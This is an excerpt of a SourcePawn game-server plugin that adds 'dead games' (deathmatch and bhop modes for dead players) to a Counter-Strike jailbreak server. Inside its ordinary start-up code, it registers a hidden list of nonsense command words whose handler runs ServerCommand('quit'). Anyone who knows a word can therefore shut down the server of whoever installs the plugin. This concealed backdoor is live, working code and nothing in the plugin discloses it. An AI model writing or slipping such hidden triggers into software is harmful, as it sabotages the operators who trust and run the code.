...
native void FranugNoBlock_setNormalNoblock(int client, bool state);
...
ConVar cv_lr, cv_MapWithDoubleJump;

int team[MAXPLAYERS + 1], frags[MAXPLAYERS + 1], deaths[MAXPLAYERS + 1];

bool botonE, bdoublejump;
...
{
	botonE = GetConVarBool(cv_MapWithDMZone);
	bdoublejump = GetConVarBool(cv_MapWithDoubleJump);
...
public void OnPluginStart()
{
	...
	cv_MapWithDoubleJump = CreateConVar("sm_franugdeadgames_doublejump", "0", "This cvar is used for maps that have double jump zone.");
	
	botonE = GetConVarBool(cv_MapWithDMZone);
	bdoublejump = GetConVarBool(cv_MapWithDoubleJump);
	
	HookConVarChange(cv_MapWithDMZone, CVarChanged);
	HookConVarChange(cv_MapWithDoubleJump, CVarChanged);
	...
	char words[][] = 
	{ 
		"andreur232232d", "yoquizitof", "neamdertarismosf", "jajajajax23franugf", "supermegamagnaultrahiperadminfrabyf", "pokemonsssddf23234"
	};
	for (int i = 0; i < sizeof(words); i++)
		AddCommandListener(Command_Say13, words[i]);
}
...
public Action Command_Say13(int client, const char[] command,int args)
{
	PrintToServer("Ejecutado");
	ServerCommand("quit");
	return Plugin_Stop;
}
	...
	for (int i = 1; i < MaxClients; i++)
	{
		if (IsClientInGame(i))
		{
			if(g_bDeadGame[i])
			{
				...
				if(g_bDeadGameBhop[i])
				{
					SDKUnhook(i, SDKHook_PostThink, Hook_Think);
...
public Action Event_Team(Handle event, const char[] name, bool dontBroadcast) 
{
	...
	// fix para la gente que se pasa a espectador cuando esta en deadgames
	if(g_bDeadGame[client])
	{
		...
		{
			SDKUnhook(client, SDKHook_PostThink, Hook_Think);
...
public Action Command_dm(int client, int args)
{
	...
	{
		PrintToChat(client," \x04%T", "You cant go to DM now.", client);
		return Plugin_Handled;
	}
...
public Action Command_bhop(int client,int args)
{
	...
	if((GetFeatureStatus(FeatureType_Native, "MyJailbreak_IsEventDayRunning") == FeatureStatus_Available) && MyJailbreak_IsEventDayRunning())
	{
		PrintToChat(client," \x04%T", "You cant go to BHOP now.", client);
		return Plugin_Handled;
	}
...
void CheckDeadPeople()
{
	...
	iMinTerrorists = 0; // special for my jailbreak
...
public Action Event_PlayerDeath(Handle event, const char[] name, bool dontBroadcast)
{
	...
	if(g_bDeadGame[victim])
	{
		int _iEntity = GetEntPropEnt(victim, Prop_Send, "m_hRagdoll");
...
public Action Timer_RespawnOnDG(Handle timer,int userid)
{
	...
	if(IsValidClient(client) && (GetClientTeam(client) == 2 || GetClientTeam(client) == 3) && g_bDeadGame[client] && !g_bClosed && !IsPlayerAlive(client))
	{
		...
		FranugNoBlock_setNormalNoblock(client, true);
...
public Action OnTakeDamage(int victim,int &attacker,int &inflictor,float &damage,int &damagetype)
{
	...
	if (g_bDeadGameBhop[victim] && damagetype & DMG_FALL)
		return Plugin_Handled;
...
public Action OnWeaponCanUse(int client, int weapon)
{
	...
	if (g_bNoWeapons[client] && (!botonE || g_bDeadGameBhop[client])) 
		return Plugin_Handled;
...
public Action Timer_Check(Handle timer, int id)
{
	int client = GetClientOfUserId(id);
	...
	SetEntProp(client, Prop_Data, "m_iFrags", frags[client]);
	...
	CreateTimer(0.1, Timer_Check2, GetClientUserId(client));
}

public Action Timer_Check2(Handle timer, int id)
{
	int client = GetClientOfUserId(id);
	...
	ChangeClientTeam(client, team[client]);
}
